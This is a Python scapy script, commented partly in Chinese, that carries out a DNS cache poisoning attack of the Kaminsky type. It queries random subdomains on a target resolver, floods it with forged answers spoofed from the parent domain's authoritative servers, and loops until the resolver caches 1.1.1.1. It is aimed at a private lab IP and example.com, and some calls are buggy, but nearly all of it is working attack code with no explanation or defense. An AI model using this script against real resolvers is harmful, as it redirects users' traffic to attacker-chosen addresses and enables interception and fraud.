# -*- coding: utf-8 -*-
"""
Created on Mon Jul  8 13:42:17 2019

@author: MyPC
"""

import scapy
from scapy.all import *
from scapy.utils import PcapReader


import threading
import random


import time
import re

#%%
 
def ipv4_addr_check(ipAddr):
    p = re.compile('^((25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(25[0-5]|2[0-4]\d|[01]?\d\d?)$')
    if p.match(ipAddr):
        return True
    else:
        return False


#输入要请求的域名，返回最终负责的IP地址列表
def Get_target_IP_list(target_server = "180.76.76.76",domain = "."):
    ans = sr1(IP(dst=target_server)/UDP(sport=RandShort(), dport=53)/DNS(rd=1,qd=DNSQR(qname=domain,qtype="NS")))
    #print(ans.show2())
    IP_list = []
    for i in range(ans.arcount):
        #print(ans.ar[i].rdata)
        if ipv4_addr_check(ans.ar[i].rdata):
            IP_list.append(ans.ar[i].rdata)
    #r = ans.ar["DNS Resource Record"]
    return IP_list
    


def fake_q(target_recursive_dns_ip,domain):
    #fake_src=str(random.randint(1,192))+"."+str(random.randint(1,192))+"."+str(random.randint(1,192))+"."+str(random.randint(1,192))
    #fake_src = "192.168.4.103"
    req =(IP(dst=target_recursive_dns_ip)/\
          UDP(sport=random.randint(2000,4000), dport=53)/\
          DNS(qr=0,ad=1, qd=DNSQR(qname=domain,  qtype="A", qclass=1),))
        
    send(req)



# 为线程定义一个函数
def DNS_QR(target_server = "202.117.0.20",qd = "www.baidu.com"):
    ans = sr1(IP(dst=target_server)/UDP(sport=random.randint(1000,10000), dport=53)/DNS(rd=1,qd=DNSQR(qname=qd,qtype="A")),timeout = 5)
    try:
        if ans:
            if ans.an:
            #print(ans.show())
                print(ans.an.rdata)
                return ans.an.rdata
        else:
            return False
    except:
        print(ans)
        os.exit()
    
    

def DNS_sending(target_server = "202.117.0.20",domain="www.sahua1.club",iplist=[],times = 500):
    if len(iplist)==0:
        print("no ip!!!")
        return 
    
    #伪造回应包
    ID = []
    for i in range(times): 
        #ID.append(random.randint(0,65535))
        ID.append(i)
    
    fake_p = IP(dst=target_server,src=iplist)/\
      UDP(sport=53, dport=33333)/\
      DNS(id=ID,qr=1,ra=1,
          qd=DNSQR(qname=domain,  qtype="A", qclass=1),
          an=DNSRR(rrname=domain,ttl = 7200,rdata="1.1.1.1")
          )
    
    send(fake_p)
        
    

def start_poison(traget_DNS_server = "202.117.0.20",traget_domain = "www.sahua.club"):
    up_domain = traget_domain[traget_domain.find('.')+1:]
    #获取目标域名的上级权威服务器
    IP_list = Get_target_IP_list(traget_DNS_server,up_domain)
    print(IP_list)
    
    trytime = 0
    while(True):
        print(trytime,time.strftime("%Y%m%d %X", time.localtime()))
        
        #构造随机域名
        rand1 = random.randint(1,10000000)
        rand_domain = str(rand1) +"."+ up_domain
        print (rand_domain)
        
        #向受害DNS服务器发送解析请求
        t1 = threading.Thread(target=fake_q,args=(traget_DNS_server,rand_domain,), daemon=True)
        t1.start() # 开始线程
        t1.join()
        
        #开始碰撞
        DNS_sending(traget_DNS_server,rand_domain,IP_list,50)

        #测试结果是否成功
        answer = DNS_QR(traget_DNS_server,rand_domain)
        print (answer)
        if (answer=="1.1.1.1"):
            os.exit()
            print("成功!!!!")
        else:
            print("失败!!!!")
        
        trytime += 1
    return 


traget_DNS_server = "192.168.109.130"
traget_domain = "www.example.com"
up_domain = traget_domain[traget_domain.find('.')+1:]
print("up_domain",up_domain)


start_poison(traget_DNS_server,traget_domain)


